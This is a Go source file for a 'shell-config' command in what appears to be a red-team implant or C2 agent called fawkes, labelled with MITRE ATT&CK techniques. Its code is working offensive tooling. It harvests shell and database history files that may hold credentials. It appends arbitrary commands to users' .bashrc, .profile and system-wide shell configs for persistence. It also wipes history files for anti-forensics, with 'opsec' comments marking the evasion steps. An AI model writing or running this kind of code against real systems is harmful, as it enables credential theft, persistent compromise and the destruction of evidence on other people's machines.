//go:build !windows

package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

type ShellConfigCommand struct{}

func (c *ShellConfigCommand) Name() string { return "shell-config" }
func (c *ShellConfigCommand) Description() string {
	return "Read shell history, list/read/inject/remove/clear shell config files (T1546.004, T1552.003, T1070.003)"
}

type shellConfigArgs struct {
	Action  string `json:"action"`
	File    string `json:"file"`
	Line    string `json:"line"`
	User    string `json:"user"`
	Lines   int    `json:"lines"`
	Comment string `json:"comment"`
}

// Shell history files to check
var shellHistoryFiles = []string{
	".bash_history",
	".zsh_history",
	".sh_history",
	".history",
	".python_history",
	".mysql_history",
	".psql_history",
	".node_repl_history",
}

// Shell config files to check
var shellConfigFiles = []string{
	".bashrc",
	".bash_profile",
	".bash_login",
	".profile",
	".zshrc",
	".zprofile",
	".zshenv",
	".zlogin",
}

// System-wide config files
var systemConfigFiles = []string{
	"/etc/profile",
	"/etc/bash.bashrc",
	"/etc/bashrc",
	"/etc/zshrc",
	"/etc/zsh/zshrc",
	"/etc/zsh/zprofile",
	"/etc/environment",
}

func (c *ShellConfigCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("Error: parameters required. Actions: history, list, read, inject, remove")
	}

	var args shellConfigArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		// Plain text fallback: "history", "list", "read .bashrc", "inject .bashrc <line>"
		parts := strings.Fields(task.Params)
		args.Action = parts[0]
		if len(parts) > 1 {
			args.File = parts[1]
		}
		if len(parts) > 2 {
			args.Line = strings.Join(parts[2:], " ")
		}
	}

	switch strings.ToLower(args.Action) {
	case "history":
		return shellHistory(args)
	case "list":
		return shellList(args)
	case "read":
		return shellRead(args)
	case "inject":
		return shellInject(args)
	case "remove":
		return shellRemove(args)
	case "clear":
		return shellClear(args)
	default:
		return errorf("Unknown action: %s\nAvailable: history, list, read, inject, remove, clear", args.Action)
	}
}

func getHomeDir(targetUser string) (string, error) {
	if targetUser != "" {
		u, err := user.Lookup(targetUser)
		if err != nil {
			return "", fmt.Errorf("cannot find user %s: %w", targetUser, err)
		}
		return u.HomeDir, nil
	}
	u, err := user.Current()
	if err != nil {
		return "", fmt.Errorf("cannot determine current user: %w", err)
	}
	return u.HomeDir, nil
}

func shellHistory(args shellConfigArgs) structs.CommandResult {
	homeDir, err := getHomeDir(args.User)
	if err != nil {
		return errorf("Error: %v", err)
	}

	maxLines := args.Lines
	if maxLines < 1 {
		maxLines = 100
	}

	var sb strings.Builder
	found := 0

	for _, histFile := range shellHistoryFiles {
		path := filepath.Join(homeDir, histFile)
		content, err := os.ReadFile(path)
		if err != nil {
			continue
		}

		lines := strings.Split(strings.TrimRight(string(content), "\n"), "\n")
		structs.ZeroBytes(content) // opsec: clear shell history (may contain credentials in commands)
		found++

		sb.WriteString(fmt.Sprintf("=== %s (%d lines total) ===\n", path, len(lines)))

		// Show last N lines
		start := 0
		if len(lines) > maxLines {
			start = len(lines) - maxLines
			sb.WriteString(fmt.Sprintf("(showing last %d lines)\n", maxLines))
		}
		for i := start; i < len(lines); i++ {
			sb.WriteString(lines[i] + "\n")
		}
		sb.WriteString("\n")
	}

	if found == 0 {
		return successf("No shell history files found in %s", homeDir)
	}

	return successResult(sb.String())
}

func shellList(args shellConfigArgs) structs.CommandResult {
	homeDir, err := getHomeDir(args.User)
	if err != nil {
		return errorf("Error: %v", err)
	}

	var sb strings.Builder

	// User config files
	sb.WriteString(fmt.Sprintf("Shell Config Files (%s)\n", homeDir))
	sb.WriteString(strings.Repeat("=", 60) + "\n")
	count := 0
	for _, f := range shellConfigFiles {
		path := filepath.Join(homeDir, f)
		info, err := os.Stat(path)
		if err != nil {
			continue
		}
		count++
		sb.WriteString(fmt.Sprintf("  [%d] %s (%d bytes)\n", count, path, info.Size()))
	}
	if count == 0 {
		sb.WriteString("  (none found)\n")
	}

	// History files
	sb.WriteString(fmt.Sprintf("\nShell History Files (%s)\n", homeDir))
	sb.WriteString(strings.Repeat("=", 60) + "\n")
	histCount := 0
	for _, f := range shellHistoryFiles {
		path := filepath.Join(homeDir, f)
		info, err := os.Stat(path)
		if err != nil {
			continue
		}
		histCount++
		lineCount := 0
		if content, err := os.ReadFile(path); err == nil {
			lineCount = strings.Count(string(content), "\n")
			structs.ZeroBytes(content) // opsec: clear shell history data
		}
		sb.WriteString(fmt.Sprintf("  [%d] %s (%d bytes, ~%d lines)\n", histCount, path, info.Size(), lineCount))
	}
	if histCount == 0 {
		sb.WriteString("  (none found)\n")
	}

	// System config files
	sb.WriteString("\nSystem-wide Config Files\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n")
	sysCount := 0
	for _, path := range systemConfigFiles {
		info, err := os.Stat(path)
		if err != nil {
			continue
		}
		sysCount++
		sb.WriteString(fmt.Sprintf("  [%d] %s (%d bytes)\n", sysCount, path, info.Size()))
	}
	if sysCount == 0 {
		sb.WriteString("  (none found)\n")
	}

	return successResult(sb.String())
}

func shellRead(args shellConfigArgs) structs.CommandResult {
	if args.File == "" {
		return errorResult("Error: file parameter required (e.g., .bashrc, .zshrc, /etc/profile)")
	}

	path := args.File
	// If relative path, resolve against home directory
	if !filepath.IsAbs(path) {
		homeDir, err := getHomeDir(args.User)
		if err != nil {
			return errorf("Error: %v", err)
		}
		path = filepath.Join(homeDir, path)
	}

	content, err := os.ReadFile(path)
	if err != nil {
		return errorf("Error reading %s: %v", path, err)
	}
	defer structs.ZeroBytes(content) // opsec: clear shell config data

	return successf("=== %s (%d bytes) ===\n%s", path, len(content), string(content))
}

func shellInject(args shellConfigArgs) structs.CommandResult {
	if args.File == "" {
		return errorResult("Error: file parameter required (e.g., .bashrc, .zshrc, .profile)")
	}
	if args.Line == "" {
		return errorResult("Error: line parameter required (command to inject)")
	}

	path := args.File
	if !filepath.IsAbs(path) {
		homeDir, err := getHomeDir(args.User)
		if err != nil {
			return errorf("Error: %v", err)
		}
		path = filepath.Join(homeDir, path)
	}

	// Build the line to inject
	line := args.Line
	if args.Comment != "" {
		line = line + " # " + args.Comment
	}

	// Read existing content to check if already present
	existing, _ := os.ReadFile(path)
	defer structs.ZeroBytes(existing) // opsec: clear shell config data
	if strings.Contains(string(existing), line) {
		return successf("Line already exists in %s — skipping injection", path)
	}

	// Append to file
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return errorf("Error opening %s: %v", path, err)
	}
	defer f.Close()

	// Ensure newline before our injection
	if len(existing) > 0 && existing[len(existing)-1] != '\n' {
		line = "\n" + line
	}
	line += "\n"

	if _, err := f.WriteString(line); err != nil {
		return errorf("Error writing to %s: %v", path, err)
	}

	return successf("Injected into %s:\n  %s", path, strings.TrimSpace(line))
}

func shellRemove(args shellConfigArgs) structs.CommandResult {
	if args.File == "" {
		return errorResult("Error: file parameter required")
	}
	if args.Line == "" {
		return errorResult("Error: line parameter required (exact line to remove)")
	}

	path := args.File
	if !filepath.IsAbs(path) {
		homeDir, err := getHomeDir(args.User)
		if err != nil {
			return errorf("Error: %v", err)
		}
		path = filepath.Join(homeDir, path)
	}

	content, err := os.ReadFile(path)
	if err != nil {
		return errorf("Error reading %s: %v", path, err)
	}
	defer structs.ZeroBytes(content) // opsec: clear shell config data

	lines := strings.Split(string(content), "\n")
	var newLines []string
	removed := 0
	for _, l := range lines {
		if strings.TrimSpace(l) == strings.TrimSpace(args.Line) ||
			strings.Contains(l, args.Line) {
			removed++
			continue
		}
		newLines = append(newLines, l)
	}

	if removed == 0 {
		return successf("Line not found in %s", path)
	}

	if err := os.WriteFile(path, []byte(strings.Join(newLines, "\n")), 0644); err != nil {
		return errorf("Error writing %s: %v", path, err)
	}

	return successf("Removed %d line(s) from %s", removed, path)
}

// shellClear securely wipes shell history files for anti-forensics (T1070.003).
// Reads the file, zeros the memory, then truncates the file to zero bytes.
// If a specific file is given, only that file is cleared; otherwise all history files.
func shellClear(args shellConfigArgs) structs.CommandResult {
	homeDir, err := getHomeDir(args.User)
	if err != nil {
		return errorf("Error: %v", err)
	}

	// Determine which files to clear
	var targets []string
	if args.File != "" {
		// Clear a specific file
		path := args.File
		if !filepath.IsAbs(path) {
			path = filepath.Join(homeDir, path)
		}
		targets = append(targets, path)
	} else {
		// Clear all history files
		for _, f := range shellHistoryFiles {
			targets = append(targets, filepath.Join(homeDir, f))
		}
	}

	var sb strings.Builder
	sb.WriteString("=== Shell History Clear ===\n\n")
	cleared := 0

	for _, path := range targets {
		info, err := os.Stat(path)
		if err != nil {
			continue // file doesn't exist, skip
		}

		origSize := info.Size()
		if origSize == 0 {
			continue // already empty
		}

		// Read content to zero it in memory (opsec)
		content, err := os.ReadFile(path)
		if err != nil {
			sb.WriteString(fmt.Sprintf("  [-] %s: read error: %v\n", path, err))
			continue
		}
		structs.ZeroBytes(content) // opsec: zero history content in memory

		// Truncate the file to zero bytes
		if err := os.Truncate(path, 0); err != nil {
			sb.WriteString(fmt.Sprintf("  [-] %s: truncate error: %v\n", path, err))
			continue
		}

		sb.WriteString(fmt.Sprintf("  [+] %s: cleared (%d bytes)\n", path, origSize))
		cleared++
	}

	if cleared == 0 {
		sb.WriteString("  No history files found or all already empty.\n")
	} else {
		sb.WriteString(fmt.Sprintf("\n  %d file(s) cleared.\n", cleared))
	}

	return successResult(sb.String())
}
